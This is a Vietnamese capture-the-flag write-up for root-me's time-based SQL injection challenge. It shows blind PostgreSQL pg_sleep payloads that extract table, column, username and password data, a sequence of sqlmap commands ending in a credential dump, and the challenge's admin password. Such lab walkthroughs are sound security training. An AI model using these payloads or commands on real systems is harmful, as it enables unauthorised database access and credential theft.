# root-me Write-ups

## Index

[SQL injection - Time based](#sql-injection---time-based)

## SQL injection - Time based

![image](https://user-images.githubusercontent.com/80137840/218170737-11260763-b9e0-4eb4-ae1d-dde60516ab43.png)

Start the challenge, ta thấy 1 trang web hiển thị form Login 

![image](https://user-images.githubusercontent.com/80137840/218172357-91eb40d7-0162-49e2-87cb-ea39f6b88e19.png)

Ngoài ra còn có trang hiển thị danh sách member có trong bài lab này

![image](https://user-images.githubusercontent.com/80137840/218172447-a6d9ffd1-eda4-499e-b871-77768fb6e283.png)

Vì bài lab yêu cầu lấy được password của **admin** nên ta thử truy cập vào member **admin** có ID=1

![image](https://user-images.githubusercontent.com/80137840/218172532-3941136f-4aba-4621-9f3d-6e8a29511814.png)

Trang web thông báo ta cần Login để xem profile của member này. Để ý trên thanh URL, ta thấy rằng các param truy vấn `action=member` và `member=1` được gửi tới server qua phương thức GET để yêu cầu truy cập tới trang member có ID=1. Đây chính là nơi ta có thể tấn công SQL injection.

Thử fuzz 1 số payload Time delay SQLi của các csdl Oracle, SQL Server, PostgreSQL, MySQL, ta tìm thấy payload `;SELECT pg_sleep(10)-- -` của PostgreSQL cho ta thấy rõ ràng thời gian response bị delay hơn so với các payload khác

![image](https://user-images.githubusercontent.com/80137840/218178393-6408b101-7981-48c2-af81-f8ea389f0909.png)

Như vậy, ta sẽ sử dụng csdl PostgreSQL thực hiện các câu SQL query để truy xuất ra password.

Đến đây ta cần phải tìm ra độ dài và tên các tables, columns và từng entry dữ liệu trong các cột username, password bằng một số payload như sau:

```
;select case when (select length(table_name) from information_schema.tables limit 1 offset §0§)=§1§ then pg_sleep(10) else pg_sleep(0) end--
;select case when substr((select table_name from information_schema.tables limit 1 offset 0),§1§,1)='§a§' then pg_sleep(10) else pg_sleep(0) end--

;select case when (select length(column_name) from information_schema.columns limit 1 offset §1§)=§1§ then pg_sleep(10) else pg_sleep(0) end--
;select case when substr((select column_name from information_schema.columns limit 1 offset 1),§1§,1)=chr(§97§) then pg_sleep(10) else pg_sleep(0) end--

;select case when (select length(username) from users limit 1 offset §0§)=§13§ then pg_sleep(10) else pg_sleep(0) end--
;select case when substr((select username from users limit 1 offset 0),§1§,1)='§a§' then pg_sleep(10) else pg_sleep(0) end--

;select case when (select length(password) from users limit 1 offset §0§)=§13§ then pg_sleep(10) else pg_sleep(0) end--
;select case when substr((select password from users limit 1 offset 0),§1§,1)=chr(§97§) then pg_sleep(10) else pg_sleep(0) end--
```

Tuy nhiên để làm ra các bước này tốn rất nhiều thời gian, nên ta sẽ sử dụng công cụ tự động **sqlmap** để tìm các tables, columns và từng entry dữ liệu trong các cột username, password.

Trước tiên ta kiểm tra xem trang member profile có bị dính SQLi hay không bằng lệnh:

`sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --cookie="158e0ed062421b049394d631da3caf6b" --batch`

Với các options:
- -u : chỉ định target URL
- --cookie : giá trị của HTTP Cookie header
- --batch : sử dụng những tùy chọn mặc định khi hỏi người dùng

![image](https://user-images.githubusercontent.com/80137840/218233144-38ac14c7-8583-4b92-90d6-daf8294b6fed.png)

Kết quả trả về csdl PostgreSQL và payload có thể inject được đó là `action=member&member=1;SELECT PG_SLEEP(5)--`

Tiếp theo, ta sẽ liệt kê các database có trong trang web bằng lệnh:

`sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --cookie="158e0ed062421b049394d631da3caf6b" --batch --dbs`

Với các options:
- --dbs : dùng để liệt kê các database

![image](https://user-images.githubusercontent.com/80137840/218233811-ee043672-6f61-42c7-a54c-aa4e7d278a3b.png)

Ta tìm được 1 database là `public`

Tiếp theo, liệt kê các tables có trong databse bằng lệnh:

`sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --cookie="158e0ed062421b049394d631da3caf6b" -D public --batch --tables`

Với các options:
- -D : chỉ định tên databse
- --tables : dùng để liệt kê các tables có trong databse

![image](https://user-images.githubusercontent.com/80137840/218233939-2e307bc9-8bbc-48eb-8e4a-c0b6df6645a1.png)

Tìm được 1 table là `users`

Tiếp tục liệt kê các columns có trong table **users** bằng lệnh:

`sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --cookie="158e0ed062421b049394d631da3caf6b" -D public -T users --batch --columns`

Với các options:
- -T : chỉ định tên table
- --columns : dùng để liệt kê các columns có trong table

![image](https://user-images.githubusercontent.com/80137840/218234028-ad882cc8-ac3c-4cf2-9920-772d7b121d44.png)

Ta tìm được 1 số columns trong bảng **users**, trong số các cột này thì có 2 cột username, password là có thể chứa thông tin hữu ích cho việc Login.

Cuối cùng, ta dump các giá trị trong 2 cột username,password trong table **users** bằng lệnh:

`sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --cookie="158e0ed062421b049394d631da3caf6b" -D public -T users -C username,password --dump`

Với các options:
- -C : chỉ định tên column, nhiều column thì cách nhau bởi dấu phẩy (,)
- --dump : dump các entries dữ liệu trong cột, bảng

![image](https://user-images.githubusercontent.com/80137840/218234250-3ba53048-eb13-43a4-830b-59201b8547d2.png)

Nhận được username, password của các user có trong csdl của trang web.

Tiến hành submit password của **admin** là `T!m3B@s3DSQL!`

![image](https://user-images.githubusercontent.com/80137840/218234346-c04fbf82-9ca4-487e-92a2-f77b23ba16d0.png)

Done!!!
